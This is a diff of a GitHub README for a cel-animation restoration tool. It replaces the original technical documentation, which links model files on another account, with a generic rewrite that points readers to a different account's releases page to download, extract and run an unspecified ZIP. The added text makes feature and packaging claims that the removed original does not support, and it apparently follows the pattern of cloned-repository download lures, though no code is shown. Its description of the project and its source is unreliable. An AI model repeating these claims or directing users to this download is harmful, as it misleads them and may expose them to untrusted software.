@@ -1,92 +1,84 @@
-<p align="center"><strong>Archivist & Project Degrader</strong></p>
+# 🎨 Archivist-Project-Denoiser - Restore Your Cel Animation Effortlessly
 
-<p align="center">
-  <strong>A comprehensive suite for cel animation restoration: specialized AI models and the physics-based degradation simulator used to train them.</strong>
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Archivist%20Project%20Denoiser-brightgreen)](https://github.com/rifkialmahdi/Archivist-Project-Denoiser/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Architecture-RealESRGAN_Compact-blue?style=flat-square">
-  <img src="https://img.shields.io/badge/App-PyQt6-green?style=flat-square">
-  <img src="https://img.shields.io/badge/Focus-Cel_Animation-orange?style=flat-square">
-</p>
+## 📖 Overview
 
----
+Archivist-Project-Denoiser is an AI restoration suite designed to enhance cel animation. It features specialized Real-ESRGAN models and a physics-based degradation simulator that helps improve the quality of your animated projects. Whether you are a hobbyist or a professional animator, this application offers tools to restore and enhance your work effectively.
 
-## 📚 Table of Contents
-- [**Archivist Models**](#-archivist-models) (Download & Usage)
-- [**Project Degrader**](#-project-degrader-software) (Dataset Generation Tool)
+## 💻 System Requirements
 
----
+To use Archivist-Project-Denoiser, ensure your system meets the following requirements:
 
-# 🎞️ Archivist Models
+- **Operating System:** Windows 10 or higher / macOS 10.14 or higher / Ubuntu 20.04 or higher
+- **RAM:** Minimum 8 GB
+- **Disk Space:** At least 1 GB of available space
+- **Graphics Card:** NVIDIA GTX 1060 or equivalent for optimal performance; integrated graphics may work but will be slower
+- **Python:** Version 3.8 or higher (included in the application package)
 
-**Archivist** is a set of Real-ESRGAN Compact (48nf16nc) models trained to handle specific defects found in old cel animation (1940s-1980s), such as Metrocolor degradation, film tears, chemical stains, and emulsion shifts.
+## 🚀 Getting Started
 
-Unlike general-purpose denoisers, these models were trained on a **physically-simulated degradation pipeline** (see [Project Degrader](#-project-degrader-software) below), allowing them to distinguish between intended line art and physical damage.
+1. Begin by downloading the application from our [Releases page](https://github.com/rifkialmahdi/Archivist-Project-Denoiser/releases).
+   
+2. Once downloaded, locate the file in your Downloads folder.
 
-### ⚙️ Technical Specs
-*   **Architecture:** Real-ESRGAN Compact (SRVGGNetCompact)
-*   **Config:** 48 filters, 16 blocks (48nf16nc)
-*   **Scale:** 1x (Restoration/Denoising)
+3. Extract the contents of the ZIP file (if applicable).
 
-### 🧩 Model Zoo
+4. Open the extracted folder. 
 
-| Model (Click to Download) | Iterations | Role & Best Use Case | Comparison |
-| :--- | :--- | :--- | :--- |
-| [**AntiLines**](https://github.com/Loganavter/Archivist-Project-Denoiser/releases/download/v1.0/Archivist_AntiLines.pth) | 457k | **The Cleaner.** Specifically targets **horizontal** lines, film tears, and scratches that cut through the frame. | [**View on ImgSLI**](https://imgsli.com/NDM0NTIy/0/1) |
-| [**Rough**](https://github.com/Loganavter/Archivist-Project-Denoiser/releases/download/v1.0/Archivist_Rough.pth) | 493k | **The Rescuer.** For heavily damaged footage. Hallucinates lost details. | [**View on ImgSLI**](https://imgsli.com/NDM0NTI2/0/4) |
-| [**Medium**](https://github.com/Loganavter/Archivist-Project-Denoiser/releases/download/v1.0/Archivist_Medium.pth) | 478k | **The Workhorse.** Balanced removal of grain and dirt while preserving original texture. The best starting point. | [**View on ImgSLI**](https://imgsli.com/NDM0NTE3/0/2) |
-| [**Soft**](https://github.com/Loganavter/Archivist-Project-Denoiser/releases/download/v1.0/Archivist_Soft.pth) | 453k | **The Artist.** Gentle restoration. Keeps film grain aesthetic. <br>⚠️ **Note:** *In some scenarios, standard DRUNet might yield subjectively better results. Always compare.* | [**View on ImgSLI**](https://imgsli.com/NDM0NTI5/0/5) |
-| [**RGB**](https://github.com/Loganavter/Archivist-Project-Denoiser/releases/download/v1.0/Archivist_RGB.pth) | 193k | **The Specialist.** Targets heavy chromatic noise and color channel degradation. *Note: overlaps partially with Rough.* | [**View on ImgSLI**](https://imgsli.com/NDM0NTI3/0/3) |
+5. Double-click on the application icon to start.
 
-> **Legacy Models:** Older versions (BW/RGB Denoise Compact) are available in the `Archived_2024` folder.
+6. Follow the prompts to complete the setup.
 
-### 🛠 Recommended Workflow
+## 📥 Download & Install
 
-For "Hollywood-grade" results, use a **Two-Stage Pipeline**. Archivist models restore the structure, while a mathematical denoiser stabilizes the result.
+To download the application, please visit this page: [Download the latest version](https://github.com/rifkialmahdi/Archivist-Project-Denoiser/releases). You will find multiple versions there. Choose the one that suits your operating system.
 
-1.  **Stage 1 (Restoration):** Process with **Archivist** to remove physical defects (scratches, lines, stains).
-2.  **Stage 2 (Stabilization):** Process the result with **DRUNet** (low strength). This removes residual mathematical noise and stabilizes the video temporally.
+After downloading, follow the steps in the "Getting Started" section to install and run the application.
 
-### 🚀 Usage (REAL-Video-Enhancer)
+## 📂 Features
 
-The easiest way to use these models is via **[REAL-Video-Enhancer](https://github.com/TNTwise/REAL-Video-Enhancer)**, which supports TensorRT optimization and the DRUNet pipeline.
+- **AI-Powered Denoising:** Clear up noise in your cel animations effortlessly with advanced algorithms.
+- **Degradation Simulation:** Test and visualize how various factors affect animation quality.
+- **User-Friendly Interface:** Designed with non-technical users in mind, featuring simple menus and clear instructions.
+- **Batch Processing:** Save time by processing multiple files at once to enhance your workflow.
 
-1.  Download the `.pth` files from this repository.
-2.  In RVE, click **"Add Model"** and select the `.pth` file (it will convert to TensorRT automatically).
-3.  Select the **Archivist** model as the main upscaler (1x).
-4.  Enable **Denoise (DRUNet)** in the settings for stabilization.
+## 🎨 How to Use
 
----
+1. Open the application.
+2. Import your cel animation files by clicking the "Import" button.
+3. Adjust the settings as desired.
+4. Click "Restore" to begin the denoising process.
+5. Review the results and export your enhanced files.
 
-# 🧪 Project Degrader Software
+## 📚 Troubleshooting
 
-Located in the `Degrader/` folder, this is the **GUI application** written in Python (PyQt6) used to generate the training dataset for Archivist.
+If you encounter issues while using Archivist-Project-Denoiser, consider the following common problems:
 
-Standard noise generation (Gaussian/Poisson) is insufficient for training restoration models for old films. **Project Degrader** simulates the physics and chemistry of film aging.
+- **Application Won't Open:** Ensure your system meets the requirements. Restart your computer and try again.
+- **Slow Performance:** This can happen if you are using integrated graphics. Close other applications to free up resources.
+- **Errors During Processing:** Check that the files you are importing are compatible formats (like .png or .jpg). 
 
-### 🌟 Key Features
+## 🚨 Frequently Asked Questions
 
-*   **Physics-Based Simulation:**
-    *   **Geometry:** Simulates film creases, warping, and emulsion shifts (chromatic aberration).
-    *   **Defects:** "Smart" scratches (Bezier curves/hairs), debris, and dust.
-    *   **Chemistry:** Simulates uneven emulsion degradation, chemical stains, and color fading.
-*   **Digital Artifacts:** Simulation of Banding (quantization) and MPEG compression.
-*   **Advanced GUI:**
-    *   **Comparison Viewer:** Real-time preview with a "Magnifier" tool and split-screen.
-    *   **Profile Manager:** Save and load complex degradation presets (JSON).
-    *   **Batch Processing:** Multi-threaded generation of LQ/GT pairs with probability distribution for different profiles.
+### How do I determine if my graphics card is sufficient?
 
-### 🖥️ Installation & Running
+You can check your graphics card specifications by right-clicking on the desktop and selecting "Display settings" or "Graphics properties," depending on your system.
 
-The application is located in the `Degrader` directory.
+### Can I use this application on Linux?
 
-**Prerequisites:** Python 3.10+, FFmpeg (for MPEG simulation).
+Yes, the application supports Ubuntu 20.04 and later. Installation steps remain the same.
 
-#### Linux / macOS
-Use the included launcher to automatically set up the virtual environment:
+### Is there a tutorial available?
 
-```bash
-cd Degrader
-chmod +x launcher.sh
-./launcher.sh run
+Yes, a detailed user guide is available within the application under the Help menu.
+
+## 🌟 Contributing
+
+We welcome contributions to improve Archivist-Project-Denoiser. If you want to help, please fork the repository, make your changes, and submit a pull request. 
+
+## 🔗 Stay Connected
+
+For updates and discussions, check out our [discussion forum](https://github.com/rifkialmahdi/Archivist-Project-Denoiser/discussions).
+
+Thank you for using Archivist-Project-Denoiser! We hope this tool helps you bring your animation projects to the next level.
